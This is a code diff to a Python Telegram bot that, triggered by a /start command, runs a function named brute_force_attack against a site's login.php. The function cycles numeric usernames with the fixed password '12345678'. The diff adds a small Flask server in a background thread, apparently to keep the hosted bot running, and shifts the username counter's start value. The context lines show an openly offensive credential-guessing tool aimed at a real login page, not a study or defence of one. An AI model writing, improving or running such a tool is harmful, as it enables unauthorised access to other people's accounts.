@@ -6,6 +6,8 @@ from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 import logging
 import asyncio
+from flask import Flask
+import threading
 
 # Enable logging
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
@@ -21,7 +23,7 @@ url = base_url + "/login.php"
 password = "12345678"
 
 # Function to perform the brute force attack
-username = 100000
+username = 100106
 async def brute_force_attack(update, context):
     global username
     while True:
@@ -66,7 +68,23 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     logging.info(f"Received /start command from {update.effective_user.username}")
     await context.bot.send_message(chat_id=update.effective_chat.id, text="Brute force attack started!")
     asyncio.create_task(brute_force_attack(update, context))
+
+# Flask app
+app = Flask(__name__)
+
+@app.route('/')
+def hello_world():
+    return 'Hello, World!'
+
+def run_flask_app():
+    app.run(host='0.0.0.0', port=10000)
+
 def main():
+    # Run Flask app in a separate thread
+    flask_thread = threading.Thread(target=run_flask_app)
+    flask_thread.daemon = True  # So that the thread dies when the main thread dies
+    flask_thread.start()
+
     application = ApplicationBuilder().token(TOKEN).build()
 
     application.add_handler(CommandHandler("start", start))
